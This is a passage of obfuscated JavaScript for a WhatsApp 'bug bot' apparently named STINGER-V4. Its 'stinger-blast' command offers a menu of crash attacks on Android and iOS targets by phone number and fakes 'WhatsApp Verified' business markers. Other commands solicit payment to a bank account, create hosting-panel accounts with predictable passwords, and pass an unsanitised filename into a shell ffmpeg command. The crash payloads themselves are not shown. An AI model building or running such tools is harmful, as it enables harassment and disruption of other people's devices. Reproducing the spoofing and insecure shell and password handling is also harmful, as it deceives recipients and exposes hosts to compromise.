          _0x1595c1("`☺️𝐌𝐚𝐤𝐞 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐨𝐟 𝟑𝐤 𝐍𝐚𝐢𝐫𝐚 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 👉𝐀𝐜𝐜𝐭 𝐍𝐨: 𝟐𝟒𝟎𝟗𝟏𝟑𝟗𝟐𝟖𝟐❄️𝐍𝐚𝐦𝐞👉𝐏𝐚𝐬𝐜𝐡𝐚𝐥𝐉𝐄👉𝐁𝐚𝐧𝐤👉𝐙𝐞𝐧𝐢𝐭𝐡𝐁𝐚𝐧𝐤☺️`");
        }
        break;
      case "confirm-pay":
        {
          sock.sendMessage("2349037524605@s.whatsapp.net", {
            text: "`💫𝐇𝐢 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒💫`\n  🧊𝐈 𝐡𝐚𝐯𝐞 𝐣𝐮𝐬𝐭 𝐦𝐚𝐝𝐞 𝐚 𝐩𝐚𝐲𝐦𝐞𝐧𝐭 𝐟𝐨𝐫 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐀𝐧𝐭𝐢-𝐁𝐮𝐠 𝐏𝐫𝐞𝐦𝐢𝐮𝐦"
          });
        }
        break;
      case "public":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          sock.public = true;
          _0x1595c1("Succes Mode Public");
        }
        break;
      case "qc":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          if (!quoted) {
            const _0x1680f8 = await sock.getName(mentionUser[0]);
            const _0x357377 = {
              url: ppuser
            };
            const _0x5987a6 = {
              id: 1,
              name: _0x1680f8,
              photo: _0x357377
            };
            const _0x51e8de = {
              entities: [],
              avatar: true,
              from: _0x5987a6,
              text: quotedMsg.chats,
              replyMessage: {}
            };
            const _0x367df1 = {
              type: "quote",
              format: "png",
              backgroundColor: "#FFFFFF",
              width: 512,
              height: 768,
              scale: 2,
              messages: [_0x51e8de]
            };
            const _0x259a09 = _0x367df1;
            const _0x33580b = axios.post("https://bot.lyo.su/quote/generate", _0x259a09, {
              headers: {
                "Content-Type": "application/json"
              }
            }).then(_0x50fe87 => {
              const _0x55eac4 = Buffer.from(_0x50fe87.data.result.image, "base64");
              const _0xe82dc2 = {
                packname: global.packname,
                author: global.author
              };
              const _0x3bab0a = _0xe82dc2;
              sock.sendStimg(from, _0x55eac4, m, _0x3bab0a);
            });
          } else if (q) {
            const _0x32844e = {
              url: ppuser
            };
            const _0x24948d = {
              id: 1,
              name: pushname,
              photo: _0x32844e
            };
            const _0x107cb3 = {
              entities: [],
              avatar: true,
              from: _0x24948d,
              text: q,
              replyMessage: {}
            };
            const _0x516dd9 = {
              type: "quote",
              format: "png",
              backgroundColor: "#FFFFFF",
              width: 512,
              height: 768,
              scale: 2,
              messages: [_0x107cb3]
            };
            const _0xa85bf3 = _0x516dd9;
            const _0x2a9338 = axios.post("https://bot.lyo.su/quote/generate", _0xa85bf3, {
              headers: {
                "Content-Type": "application/json"
              }
            }).then(_0x178296 => {
              const _0x1cb4b4 = Buffer.from(_0x178296.data.result.image, "base64");
              const _0x155523 = {
                packname: global.packname,
                author: global.author
              };
              const _0x1c7517 = _0x155523;
              sock.sendStimg(from, _0x1cb4b4, m, _0x1c7517);
            });
          } else {
            _0x1595c1("Send the command " + (prefixMatch + command) + " STINGER-V4");
          }
        }
        break;
      case "mangap":
        {
          _0x1595c1("Thanks " + pushname + " For The Compliment");
        }
        break;
      case "ai":
        {
          if (!text2) {
            return _0x1595c1("*• Example:* " + (prefixMatch + command) + " Who was the person who invented the Computer in the Majapahit era");
          }
          await sock.sendMessage(m.chat, {
            react: {
              text: "⏱️",
              key: m.key
            }
          });
          try {
            let _0x28e4e8 = await (await fetch("https://widipe.com/openai?text=" + text2)).json();
            const _0x555245 = {
              text: namabot
            };
            const _0x215f2b = {
              upload: sock.waUploadToServer
            };
            let _0x388a78 = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: "> Zyn - AI\n\n" + _0x28e4e8.result
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create(_0x555245),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...(await prepareWAMessageMedia({
                        image: fs.readFileSync("./database/image/STINGER-V4.jpg")
                      }, _0x215f2b))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: "{\"display_text\":\"Nice Zyn - AI\",\"id\":\".mangap\"}"
                      }]
                    }),
                    contextInfo: {
                      mentionedJid: [m.sender],
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                        newsletterJid: "0@newsletter",
                        newsletterName: namabot,
                        serverMessageId: 143
                      }
                    }
                  })
                }
              }
            }, {
              quoted: m
            });
            await sock.relayMessage(m.chat, _0x388a78.message, {});
          } catch (_0x5492f8) {
            return _0x1595c1("Error Kak :(");
          }
        }
        break;
      case "stinger-blast":
        {
          await sock.sendMessage(m.chat, {
            react: {
              text: "❄️",
              key: m.key
            }
          });
          if (!q) {
            return _0x1595c1("Example: " + (prefixMatch + command) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x59a4a3 = "*𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔*\n\n*𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒*\n\n⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟\n" + ("❄️ 𝐙𝐲𝐧 𝐀𝐧𝐝𝐫𝐨 (Reply with: vip " + target + ")\n") + ("❄️ 𝐓𝐫𝐚𝐬𝐡 𝐋𝐨𝐜 (Reply with: andro " + target + ")\n") + ("❄️ 𝐈𝐧𝐯𝐢𝐬𝐢𝐱 𝐂𝐫𝐚𝐬𝐡 (Reply with: sting-atk " + target + ")\n\n") + "⌜ 𝐈𝚯𝐒 ⌟\n" + ("❄️ 𝐂𝐫𝐚𝐬𝐡 𝐈𝐨𝐬 (Reply with: sting-ios " + target + ")\n") + ("❄️ 𝐊𝐢𝐥𝐥 𝐈𝐨𝐬 (Reply with: xip " + target + ")\n") + ("❄️ 𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬 (Reply with: iphone " + target + ")\n\n") + "⌜️𝐒𝐓𝐈𝐍𝐆𝐄𝐑⌟\n" + ("❄️ 𝐂𝐫𝐚𝐬𝐡 𝐅𝐥𝐨𝐰 (Reply with: sting-crash " + target + ")\n") + ("❄️ 𝐕𝐚𝐬𝐢𝐨𝐧 (Reply with: vasion " + target + ")\n") + ("❄️ 𝐎𝐯𝐞𝐫𝐟𝐥𝐨𝐰 (Reply with: overflow " + target + ")\n\n");
          let _0x4859e7 = "Powered by ❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️";
          let _0x24c85f = global.isLink;
          let _0xe8a22b = generateWAMessageFromContent(m.chat, {
            extendedTextMessage: {
              text: _0x59a4a3,
              matchedText: "❇️ WhatsApp Verified",
              footer: _0x4859e7,
              contextInfo: {
                externalAdReply: {
                  title: "𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒",
                  body: "Join our official channel for updates!",
                  mediaUrl: _0x24c85f,
                  thumbnail: await fs.readFileSync("./database/image/ES_TEAMS.jpg"),
                  mediaType: 2,
                  sourceUrl: _0x24c85f
                },
                mentionedJid: [m.sender],
                isForwarded: true,
                forwardingScore: 127,
                verifiedBusiness: true
              }
            }
          }, {});
          await sock.relayMessage(_0xe8a22b.key.remoteJid, _0xe8a22b.message, {
            messageId: _0xe8a22b.key.id
          });
        }
        break;
      case "hdvid":
      case "hdvideo":
      case "vidiohd":
      case "tohd":
      case "vidhd":
        {
          const {
            TelegraPh: _0x85cdca
          } = require("../database/lib//uploader");
          const {
            exec: _0x442899
          } = require("child_process");
          const _0x273179 = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? sock.user.jid : m.sender;
          const _0x119fbf = m.quoted ? m.quoted : m;
          const _0x293b9c = (_0x119fbf.msg || _0x119fbf).mimetype || "";
          if (!_0x293b9c) {
            return m.reply("Where's the video, bro?");
          }
          _0x1595c1(mess.wait);
          const _0x142225 = await sock.downloadAndSaveMediaMessage(_0x119fbf);
          const _0x3053f9 = await _0x85cdca(_0x142225);
          const _0x5c7fd9 = "output.mp4";
          _0x442899("ffmpeg -i " + _0x142225 + " -s 1280x720 -c:v libx264 -c:a copy " + _0x5c7fd9, (_0x260565, _0x5774ec, _0x38d13a) => {
            if (_0x260565) {
              console.error("Error: " + _0x260565.message);
              return;
            }
            console.log("stdout: " + _0x5774ec);
            console.error("stderr: " + _0x38d13a);
            const _0x2bab56 = {
              url: _0x5c7fd9
            };
            const _0x56b6b9 = {
              caption: "_Success To HD Video_",
              video: _0x2bab56
            };
            sock.sendMessage(m.chat, _0x56b6b9, {
              quoted: m
            });
          });
          await sleep(60000);
          fs.unlinkSync(_0x5c7fd9);
          fs.unlinkSync(_0x142225);
        }
        break;
      case "enc":
      case "encrypt":
      case "obfuscate":
        {
          if (!q) {
            return _0x1595c1("Example " + (prefixMatch + command) + " const time = require('money')");
          }
          let _0xfbb00c = await _0x68eab(q);
          _0x1595c1("" + _0xfbb00c.result);
        }
        break;
      case "1gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x4f6c6b = text2.split(",");
          if (_0x4f6c6b.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x4a59da = _0x4f6c6b[0];
          let _0x34c5de = m.quoted ? m.quoted.sender : _0x4f6c6b[1] ? _0x4f6c6b[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x2123f0 = _0x4a59da;
          let _0x3bd08a = global.eggsnya;
          let _0xd4a4fb = global.location;
          let _0x53ab91 = "1024";
          let _0x51be72 = "50";
          let _0x36c263 = "1024";
          let _0x21d214 = _0x4a59da + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x34c5de) {
            return;
          }
          let _0x50f1d4 = (await sock.onWhatsApp(_0x34c5de.split`@`[0]))[0] || {};
          let _0x20d069 = _0x4a59da + "001";
          const _0x1ca68a = {
            email: _0x21d214,
            username: _0x4a59da,
            first_name: _0x4a59da,
            last_name: _0x4a59da,
            language: "en",
            password: _0x20d069
          };
          let _0x4574aa = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x1ca68a)
          });
          let _0x1c7659 = await _0x4574aa.json();
          if (_0x1c7659.errors) {
            return _0x1595c1(JSON.stringify(_0x1c7659.errors[0], null, 2));
          }
          let _0x1dff0c = _0x1c7659.attributes;
          let _0x4599bd = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3bd08a, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x1dff0c.id);
          let _0x1a1c0b = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x1dff0c.username + "\n🔐 Password: " + _0x20d069 + "\n🔗 Url: " + domain;
          const _0x511421 = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x1a1c0b
          };
          const _0xd78960 = {
            quoted: m
          };
          sock.sendMessage(_0x34c5de, _0x511421, _0xd78960);
          let _0x2f8212 = await _0x4599bd.json();
          let _0x4fe7c1 = _0x2f8212.attributes.startup;
          const _0xbf9757 = {
            memory: _0x53ab91,
            swap: 0,
            disk: _0x36c263,
            io: 500,
            cpu: _0x51be72
          };
          let _0x5f13fd = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x2123f0 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x1dff0c.id,
              egg: parseInt(_0x3bd08a),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x4fe7c1,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0xbf9757,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0xd4a4fb)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x869e68 = await _0x5f13fd.json();
          if (_0x869e68.errors) {
            return sock(JSON.stringify(_0x869e68.errors[0], null, 2));
          }
          let _0x1e19c5 = _0x869e68.attributes;
          let _0x586c10 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x1dff0c.id + "\nUsername: " + _0x1dff0c.username + "\nEmail: " + _0x1dff0c.email + "\nName: " + _0x1dff0c.first_name + " " + _0x1dff0c.last_name + "\nMemory: " + (_0x1e19c5.limits.memory === 0 ? "Unlimited" : _0x1e19c5.limits.memory) + " MB\nDisk: " + (_0x1e19c5.limits.disk === 0 ? "Unlimited" : _0x1e19c5.limits.disk + "MB") + "\nCpu: " + (_0x1e19c5.limits.cpu === 0 ? "Unlimited" : _0x1e19c5.limits.cpu + "%"));
        }
        break;
      case "2gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x5e4dc6 = text2.split(",");
          if (_0x5e4dc6.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x21a481 = _0x5e4dc6[0];
          let _0x4bdc71 = m.quoted ? m.quoted.sender : _0x5e4dc6[1] ? _0x5e4dc6[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x3a94c3 = _0x21a481;
          let _0xdca89e = global.eggsnya;
          let _0x37f0f2 = global.location;
          let _0x304060 = "2024";
          let _0x59f6d7 = "70";
          let _0x35bb86 = "2024";
          let _0x12c6d0 = _0x21a481 + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x4bdc71) {
            return;
          }
          let _0x2c2030 = (await sock.onWhatsApp(_0x4bdc71.split`@`[0]))[0] || {};
          let _0x87c507 = _0x21a481 + "001";
          const _0x26436f = {
            email: _0x12c6d0,
            username: _0x21a481,
            first_name: _0x21a481,
            last_name: _0x21a481,
            language: "en",
            password: _0x87c507
          };
          let _0x5f4a6d = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x26436f)
          });
          let _0x48918f = await _0x5f4a6d.json();
          if (_0x48918f.errors) {
            return _0x1595c1(JSON.stringify(_0x48918f.errors[0], null, 2));
          }
          let _0x5116ed = _0x48918f.attributes;
          let _0x3d0806 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xdca89e, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x5116ed.id);
          let _0x3c7db2 = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x5116ed.username + "\n🔐 Password: " + _0x87c507 + "\n🔗 Url: " + domain;
          const _0x1a49b7 = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x3c7db2
          };
          const _0x131215 = {
            quoted: m
          };
          sock.sendMessage(_0x4bdc71, _0x1a49b7, _0x131215);
          let _0x539639 = await _0x3d0806.json();
          let _0x5817c2 = _0x539639.attributes.startup;
          const _0x116cfd = {
            memory: _0x304060,
            swap: 0,
            disk: _0x35bb86,
            io: 500,
            cpu: _0x59f6d7
          };
          let _0x35faf3 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x3a94c3 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x5116ed.id,
              egg: parseInt(_0xdca89e),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x5817c2,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x116cfd,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x37f0f2)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x597dbb = await _0x35faf3.json();
          if (_0x597dbb.errors) {
            return sock(JSON.stringify(_0x597dbb.errors[0], null, 2));
          }
          let _0x249ce8 = _0x597dbb.attributes;
          let _0x450cb4 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x5116ed.id + "\nUsername: " + _0x5116ed.username + "\nEmail: " + _0x5116ed.email + "\nName: " + _0x5116ed.first_name + " " + _0x5116ed.last_name + "\nMemory: " + (_0x249ce8.limits.memory === 0 ? "Unlimited" : _0x249ce8.limits.memory) + " MB\nDisk: " + (_0x249ce8.limits.disk === 0 ? "Unlimited" : _0x249ce8.limits.disk + "MB") + "\nCpu: " + (_0x249ce8.limits.cpu === 0 ? "Unlimited" : _0x249ce8.limits.cpu + "%"));
        }
        break;
      case "3gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x46694a = text2.split(",");
          if (_0x46694a.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x15c73e = _0x46694a[0];
          let _0x484ff4 = m.quoted ? m.quoted.sender : _0x46694a[1] ? _0x46694a[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x1c19df = _0x15c73e;
          let _0x2e418d = global.eggsnya;
          let _0x3a9cca = global.location;
          let _0x49deee = "3024";
          let _0x42a662 = "80";
          let _0x104fe3 = "3024";
          let _0x4065bc = _0x15c73e + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x484ff4) {
            return;
          }
          let _0xfd270c = (await sock.onWhatsApp(_0x484ff4.split`@`[0]))[0] || {};
          let _0x481bb2 = _0x15c73e + "001";
          const _0x55eade = {
            email: _0x4065bc,
            username: _0x15c73e,
            first_name: _0x15c73e,
            last_name: _0x15c73e,
            language: "en",
            password: _0x481bb2
          };
          let _0x1422cc = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x55eade)
          });
          let _0x4eac7e = await _0x1422cc.json();
          if (_0x4eac7e.errors) {
            return _0x1595c1(JSON.stringify(_0x4eac7e.errors[0], null, 2));
          }
          let _0x591181 = _0x4eac7e.attributes;
          let _0x3e5530 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2e418d, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x591181.id);
          let _0xfe9452 = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x591181.username + "\n🔐 Password: " + _0x481bb2 + "\n🔗 Url: " + domain;
          const _0x4dac74 = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0xfe9452
          };
          const _0x4d73c1 = {
            quoted: m
          };
          sock.sendMessage(_0x484ff4, _0x4dac74, _0x4d73c1);
          let _0x602228 = await _0x3e5530.json();
          let _0x2be754 = _0x602228.attributes.startup;
          const _0x175da3 = {
            memory: _0x49deee,
            swap: 0,
            disk: _0x104fe3,
            io: 500,
            cpu: _0x42a662
          };
          let _0x557e92 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x1c19df + " - 1gb",
              description: "Create with " + namabot,
              user: _0x591181.id,
              egg: parseInt(_0x2e418d),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x2be754,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x175da3,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x3a9cca)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x305588 = await _0x557e92.json();
          if (_0x305588.errors) {
            return sock(JSON.stringify(_0x305588.errors[0], null, 2));
          }
          let _0x1ad66b = _0x305588.attributes;
          let _0x5e4943 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x591181.id + "\nUsername: " + _0x591181.username + "\nEmail: " + _0x591181.email + "\nName: " + _0x591181.first_name + " " + _0x591181.last_name + "\nMemory: " + (_0x1ad66b.limits.memory === 0 ? "Unlimited" : _0x1ad66b.limits.memory) + " MB\nDisk: " + (_0x1ad66b.limits.disk === 0 ? "Unlimited" : _0x1ad66b.limits.disk + "MB") + "\nCpu: " + (_0x1ad66b.limits.cpu === 0 ? "Unlimited" : _0x1ad66b.limits.cpu + "%"));
        }
        break;
      case "4gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x169c3 = text2.split(",");
          if (_0x169c3.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0xf28682 = _0x169c3[0];
          let _0x94244f = m.quoted ? m.quoted.sender : _0x169c3[1] ? _0x169c3[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x327284 = _0xf28682;
          let _0xc21b87 = global.eggsnya;
          let _0x43334a = global.location;
          let _0x31cb9d = "4024";
          let _0x56cf21 = "80";
          let _0x2ffe24 = "4024";
          let _0x2b0fe0 = _0xf28682 + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x94244f) {
            return;
          }
          let _0x15f050 = (await sock.onWhatsApp(_0x94244f.split`@`[0]))[0] || {};
          let _0x132044 = _0xf28682 + "001";
          const _0x3cbe77 = {
            email: _0x2b0fe0,
            username: _0xf28682,
            first_name: _0xf28682,
            last_name: _0xf28682,
            language: "en",
            password: _0x132044
          };
          let _0x328d1e = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x3cbe77)
          });
          let _0x3acf9f = await _0x328d1e.json();
          if (_0x3acf9f.errors) {
            return _0x1595c1(JSON.stringify(_0x3acf9f.errors[0], null, 2));
          }
          let _0x2baf65 = _0x3acf9f.attributes;
          let _0x3fe247 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xc21b87, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x2baf65.id);
          let _0x4e645c = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x2baf65.username + "\n🔐 Password: " + _0x132044 + "\n🔗 Url: " + domain;
          const _0x3970a0 = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x4e645c
          };
          const _0x46bcbf = {
            quoted: m
          };
          sock.sendMessage(_0x94244f, _0x3970a0, _0x46bcbf);
          let _0x2bd177 = await _0x3fe247.json();
          let _0x20842e = _0x2bd177.attributes.startup;
          const _0x191189 = {
            memory: _0x31cb9d,
            swap: 0,
            disk: _0x2ffe24,
            io: 500,
            cpu: _0x56cf21
          };
          let _0x17d8bf = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x327284 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x2baf65.id,
              egg: parseInt(_0xc21b87),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x20842e,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x191189,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x43334a)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x32a78b = await _0x17d8bf.json();
          if (_0x32a78b.errors) {
            return sock(JSON.stringify(_0x32a78b.errors[0], null, 2));
          }
          let _0x1e1773 = _0x32a78b.attributes;
          let _0x5ef22b = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x2baf65.id + "\nUsername: " + _0x2baf65.username + "\nEmail: " + _0x2baf65.email + "\nName: " + _0x2baf65.first_name + " " + _0x2baf65.last_name + "\nMemory: " + (_0x1e1773.limits.memory === 0 ? "Unlimited" : _0x1e1773.limits.memory) + " MB\nDisk: " + (_0x1e1773.limits.disk === 0 ? "Unlimited" : _0x1e1773.limits.disk + "MB") + "\nCpu: " + (_0x1e1773.limits.cpu === 0 ? "Unlimited" : _0x1e1773.limits.cpu + "%"));
        }
        break;
      case "5gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x38f0b7 = text2.split(",");
          if (_0x38f0b7.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x2fb173 = _0x38f0b7[0];
          let _0x2c3d3a = m.quoted ? m.quoted.sender : _0x38f0b7[1] ? _0x38f0b7[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x3ff0f0 = _0x2fb173;
          let _0x1c1547 = global.eggsnya;
          let _0x14763f = global.location;
          let _0x511b3b = "5024";
          let _0x5e0887 = "100";
          let _0x32f662 = "5024";
          let _0x35fa0e = _0x2fb173 + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x2c3d3a) {
            return;
          }
          let _0x4fd434 = (await sock.onWhatsApp(_0x2c3d3a.split`@`[0]))[0] || {};
          let _0x26cb6b = _0x2fb173 + "001";
          const _0x11b622 = {
            email: _0x35fa0e,
            username: _0x2fb173,
            first_name: _0x2fb173,
            last_name: _0x2fb173,
            language: "en",
            password: _0x26cb6b
          };
          let _0x513dc2 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x11b622)
          });
          let _0x36e47c = await _0x513dc2.json();
          if (_0x36e47c.errors) {
            return _0x1595c1(JSON.stringify(_0x36e47c.errors[0], null, 2));
          }
          let _0x4e0db4 = _0x36e47c.attributes;
          let _0x50eec3 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x1c1547, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x4e0db4.id);
          let _0x14fe46 = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x4e0db4.username + "\n🔐 Password: " + _0x26cb6b + "\n🔗 Url: " + domain;
          const _0x952994 = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x14fe46
          };
          const _0x401e68 = {
            quoted: m
          };
          sock.sendMessage(_0x2c3d3a, _0x952994, _0x401e68);
          let _0x51a4ba = await _0x50eec3.json();
          let _0xbcd0b7 = _0x51a4ba.attributes.startup;
          const _0x187997 = {
            memory: _0x511b3b,
            swap: 0,
            disk: _0x32f662,
            io: 500,
            cpu: _0x5e0887
          };
          let _0x20707a = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x3ff0f0 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x4e0db4.id,
              egg: parseInt(_0x1c1547),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0xbcd0b7,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x187997,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x14763f)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x50f221 = await _0x20707a.json();
          if (_0x50f221.errors) {
            return sock(JSON.stringify(_0x50f221.errors[0], null, 2));
          }
          let _0x268e05 = _0x50f221.attributes;
